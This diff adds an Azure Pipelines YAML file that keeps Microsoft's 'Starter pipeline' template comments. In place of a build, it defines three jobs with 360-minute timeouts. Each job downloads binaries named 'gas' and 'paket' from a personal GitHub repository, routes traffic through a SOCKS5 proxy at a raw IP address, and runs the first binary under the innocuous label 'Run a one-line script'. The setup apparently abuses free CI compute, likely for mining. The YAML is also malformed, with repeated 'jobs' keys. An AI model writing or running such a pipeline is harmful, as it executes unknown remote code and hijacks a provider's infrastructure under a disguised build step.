@@ -1,0 +1,34 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+jobs:
+- job: aa
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+steps:
+- script: wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1
+  displayName: 'Run a one-line script'
+
+jobs:
+- job: ab
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+steps:
+- script: wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1
+  displayName: 'Run a one-line script'
+
+jobs:
+- job: ac
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+steps:
+- script: wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1
+  displayName: 'Run a one-line script'
